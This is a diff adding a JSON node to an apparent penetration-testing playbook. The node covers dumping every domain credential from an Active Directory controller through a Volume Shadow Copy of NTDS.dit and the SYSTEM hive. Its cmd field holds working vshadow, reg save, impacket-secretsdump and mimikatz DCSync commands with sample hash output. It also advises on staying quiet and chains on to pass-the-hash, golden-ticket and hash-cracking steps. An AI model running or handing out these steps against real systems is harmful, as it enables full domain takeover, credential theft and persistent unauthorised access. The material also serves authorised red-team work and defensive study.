@@ -1,0 +1,34 @@
+{
+  "id": "shadow_copy_ntds",
+  "phase": "POST",
+  "title": "Shadow Copy + NTDS Extraction — Dump Every Domain Hash Offline",
+  "body": "Once you're domain admin on the DC, the whole domain's credentials live in one file: C:\\Windows\\NTDS\\NTDS.dit (the AD database). It's locked while AD runs, so you can't just copy it. Volume Shadow Copy (VSS) takes a snapshot of the volume, and you copy NTDS.dit out of the snapshot — then extract every user's NTLM hash and Kerberos key offline on Kali with secretsdump.\n\nWHAT YOU GET:\n  NTLM hashes + Kerberos keys for EVERY domain account — all users, all computer accounts, krbtgt. This is the full domain. From here you can pass-the-hash as anyone, crack offline, or forge golden tickets with krbtgt's hash.\n\nPREREQUISITE: domain admin on the DC. Like golden ticket, this is post-domain-compromise — it's how you HARVEST everything after popping the DC, not an entry vector.\n\nTHREE INGREDIENTS for offline extraction:\n  1. NTDS.dit (from the shadow copy) — the database\n  2. The SYSTEM registry hive — holds the boot key that decrypts it\n  3. secretsdump with the LOCAL keyword to parse them on Kali\n\nALTERNATIVE — DCSync is quieter:\n  Shadow copy writes files and leaves a trail. DCSync (lsadump::dcsync) pulls hashes over the replication protocol with no file drop and no DC login needed (just DA-equivalent rights). Prefer DCSync on engagements where stealth matters; shadow copy is the 'I'm already on the DC with a shell' approach.\n\nThe krbtgt hash from this dump is exactly what feeds a golden ticket — chain them for persistence.",
+  "cmd": "# ══════════════════════════════════════════════════\n# ON THE DC (as a domain admin, elevated cmd) — create a shadow copy\n# ══════════════════════════════════════════════════\nC:\\Tools> vshadow.exe -nw -p C:\n#   -nw  no writers (faster)   -p  persist on disk\n# Note the 'Shadow copy device name', e.g.:\n#   \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\n\n# Copy NTDS.dit out of the snapshot:\nC:\\Tools> copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak\n\n# Save the SYSTEM hive (holds the boot key to decrypt NTDS):\nC:\\> reg.exe save hklm\\system c:\\system.bak\n\n# ══════════════════════════════════════════════════\n# EXFIL both .bak files to Kali, then extract offline\n# ══════════════════════════════════════════════════\nimpacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL\n#   dumps domain\\uid:rid:lmhash:nthash for EVERY account, plus Kerberos keys\n#   Administrator:500:...:2892d26cdf84d7a70e2eb3b9f05c425e:::\n#   krbtgt:502:...:1693c6cefafffc7af11ef34d1c788f47:::   <- feeds a golden ticket\n#   (every user + COMPUTER$ account + krbtgt)\n\n# ══════════════════════════════════════════════════\n# QUIETER ALTERNATIVE — DCSync (no files, no DC login)\n# ══════════════════════════════════════════════════\n# From any DA-equivalent box:\nmimikatz # lsadump::dcsync /domain:corp.com /all\n# or just one account:\nmimikatz # lsadump::dcsync /user:krbtgt\n# impacket:\nimpacket-secretsdump corp.com/da_user@dc1.corp.com -just-dc\n#   -just-dc      all domain hashes via replication\n#   -just-dc-user krbtgt   just one\n\n# ══════════════════════════════════════════════════\n# WHAT TO DO WITH THE LOOT\n# ══════════════════════════════════════════════════\n# - Pass-the-hash as Administrator (RID 500) anywhere\n# - Forge a golden ticket with krbtgt's hash (persistence)\n# - Crack offline with hashcat -m 1000 for cleartext (reuse on web logins etc.)\n# - Computer account hashes ($) for resource-based delegation / silver tickets",
+  "warn": "Requires domain admin on the DC — this is post-compromise credential harvesting, not an entry vector. The shadow-copy method writes files (ntds.dit.bak, system.bak) and leaves a trail; DCSync is the quieter alternative. The resulting dump contains EVERY domain credential including krbtgt — handle and store it like the crown jewels, and clean up the .bak files and shadow copy afterward.",
+  "choices": [
+    {
+      "label": "Quieter — pull hashes via DCSync instead",
+      "next": "dcsync"
+    },
+    {
+      "label": "Got krbtgt's hash — forge a golden ticket (persistence)",
+      "next": "golden_ticket"
+    },
+    {
+      "label": "Crack the dumped NTLM hashes",
+      "next": "hashcat_roast_cracking"
+    },
+    {
+      "label": "Pass-the-hash with what I dumped",
+      "next": "pth"
+    },
+    {
+      "label": "Document the domain compromise",
+      "next": "doc_cred_access"
+    },
+    {
+      "label": "Back to jump menu",
+      "next": "jump_menu"
+    }
+  ]
+}
